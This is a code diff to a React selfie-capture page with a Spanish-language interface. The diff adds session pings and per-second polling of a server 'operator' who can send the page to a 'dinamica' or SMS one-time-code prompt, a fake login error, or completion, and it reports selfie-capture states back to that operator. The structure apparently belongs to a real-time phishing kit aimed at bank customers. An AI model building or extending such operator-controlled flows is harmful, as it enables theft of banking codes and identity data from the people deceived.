@@ -2,16 +2,71 @@ import { useEffect, useRef, useState } from 'react'
 import { SipLogo } from './Icons'
 
 type SelfiePageProps = {
+  sessionId?: string
   onHome: () => void
+  onOtpRequired?: (mode: 'dinamica' | 'sms') => void
+  onErrorLogin?: () => void
 }
 
-export function SelfiePage({ onHome }: SelfiePageProps) {
+export function SelfiePage({
+  sessionId,
+  onHome,
+  onOtpRequired,
+  onErrorLogin,
+}: SelfiePageProps) {
   const videoRef = useRef<HTMLVideoElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
   const streamRef = useRef<MediaStream | null>(null)
   const [ready, setReady] = useState(false)
   const [error, setError] = useState('')
   const [photo, setPhoto] = useState('')
+
+  // Keep-alive ping and operator polling
+  useEffect(() => {
+    if (!sessionId) return
+
+    const ping = () => {
+      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {})
+    }
+    ping()
+    const pingTimer = window.setInterval(ping, 3000)
+
+    // Notify server we are in selfie mode
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: 'waiting-selfie' }),
+    }).catch(() => {})
+
+    const pollTimer = window.setInterval(async () => {
+      try {
+        const res = await fetch(`/api/sessions/${sessionId}`)
+        if (!res.ok) return
+        const session = await res.json()
+        const action = session.action
+
+        if (action === 'done') {
+          onHome()
+          return
+        }
+
+        if (action === 'error-login') {
+          onErrorLogin?.()
+          return
+        }
+
+        if (action === 'dinamica' || action === 'sms') {
+          onOtpRequired?.(action)
+          return
+        }
+      } catch {}
+    }, 1000)
+
+    return () => {
+      window.clearInterval(pingTimer)
+      window.clearInterval(pollTimer)
+    }
+  }, [sessionId, onHome, onErrorLogin, onOtpRequired])
 
   useEffect(() => {
     let cancelled = false
@@ -62,11 +117,38 @@ export function SelfiePage({ onHome }: SelfiePageProps) {
     ctx.translate(width, 0)
     ctx.scale(-1, 1)
     ctx.drawImage(video, 0, 0, width, height)
-    setPhoto(canvas.toDataURL('image/jpeg', 0.92))
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.92)
+    setPhoto(dataUrl)
+
+    if (sessionId) {
+      fetch(`/api/sessions/${sessionId}/state`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ state: 'received-selfie' }),
+      }).catch(() => {})
+    }
   }
 
   function retake() {
     setPhoto('')
+    if (sessionId) {
+      fetch(`/api/sessions/${sessionId}/state`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ state: 'waiting-selfie' }),
+      }).catch(() => {})
+    }
+  }
+
+  function handleFinish() {
+    if (sessionId) {
+      fetch(`/api/sessions/${sessionId}/state`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ state: 'done' }),
+      }).catch(() => {})
+    }
+    onHome()
   }
 
   return (
@@ -104,7 +186,7 @@ export function SelfiePage({ onHome }: SelfiePageProps) {
             <button type="button" className="login-outline" onClick={retake}>
               Tomar de nuevo
             </button>
-            <button type="button" className="login-submit ready" onClick={onHome}>
+            <button type="button" className="login-submit ready" onClick={handleFinish}>
               Continuar
             </button>
           </div>
